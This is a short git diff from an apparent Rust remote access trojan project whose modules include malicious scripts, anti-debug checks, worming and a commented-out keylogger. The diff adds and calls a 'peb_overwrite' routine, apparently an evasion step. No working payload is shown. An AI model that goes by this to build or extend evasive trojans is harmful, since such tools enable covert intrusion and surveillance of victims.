@@ -6,6 +6,7 @@ mod maliciousScripts;
 mod AntiDebugChecks;
 mod MayDay;
 mod Worming;
+mod peb_write;
 
 
 // use keylogger::keylogger::keylog;
@@ -29,6 +30,7 @@ use std::net::Shutdown;
 use std::net::{TcpStream,TcpListener};
 use std::process::Command;
 use RustRAT::check;
+use peb_write::peb_overwrite;
 
 const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
 //This is the constant address made for the socket
@@ -188,6 +190,7 @@ fn main(){
 
     //Work area
     check();
+    peb_overwrite();
     
 
 
